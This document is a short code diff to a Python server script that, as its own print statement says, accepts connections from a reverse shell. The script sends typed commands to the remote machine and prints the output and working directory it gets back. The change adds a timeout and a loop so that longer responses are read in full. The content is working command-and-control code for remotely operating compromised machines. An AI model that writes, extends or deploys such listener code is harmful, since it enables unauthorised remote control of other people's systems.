@@ -14,6 +14,7 @@ def start_server():
     while True:
         try:
             conn, addr = s.accept()
+            conn.settimeout(0.7)
             print("Got connection from reverse shell in ", addr)
             cwd = conn.recv(1024).decode()
             if len(cwd)==0:
@@ -25,7 +26,12 @@ def start_server():
                     command = input(f"{cwd}> ")
                     print("command is ", command.encode())
                     conn.send(command.encode())
-                    response = conn.recv(1024).decode()
+                    response = ""
+                    while True:
+                        try:
+                            response = response + conn.recv(1024).decode()
+                        except socket.timeout:
+                            break
                     output = response.split("cURR_dIR")[0]
                     cwd = response.split("cURR_dIR")[1]
                     print(output)
